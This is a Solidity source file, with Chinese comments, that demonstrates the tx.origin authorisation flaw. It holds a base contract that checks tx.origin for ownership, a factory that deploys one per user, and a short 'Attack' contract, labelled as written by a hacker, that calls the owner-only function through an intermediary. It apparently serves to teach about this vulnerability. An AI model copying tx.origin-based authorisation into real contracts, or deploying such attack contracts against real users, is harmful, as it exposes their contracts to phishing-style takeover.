// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

/// @dev 基础合约
contract BaseContract {
    address owner;
    string message;

    constructor() {
        owner = tx.origin;
    }

    function setMsg(string memory _message) external {
        require(tx.origin == owner, "No permission.");
        message = _message;
    }

    function getMsg() external view returns (string memory) {
        return message;
    }

    function getOwner() external view returns (address) {
        return owner;
    }
}


/// @dev 调用合约 BaseContract
contract CallBaseContract {
    // 用户账户对应新的合约BaseContract的地址，即一个用户一个基合约地址
    mapping(address => address) userBaseContractAddr;

    function createUserBaseContract(string memory _message) external {
        require(getUserBaseContractAddr(msg.sender) == address(0), "The user already exists.");
        BaseContract bc = new BaseContract();
        userBaseContractAddr[msg.sender] = address(bc);
        BaseContract(address(bc)).setMsg(_message);
    }

    function getUserBaseContractAddr(address _addr) public view returns (address) {
        return userBaseContractAddr[_addr];
    }
}


/// @dev 攻击合约（黑客编写）
contract Attack {

    function attack(BaseContract _bcAddr) external {
        BaseContract bc = BaseContract(_bcAddr);
        bc.setMsg("I already have attacked.");
    }
}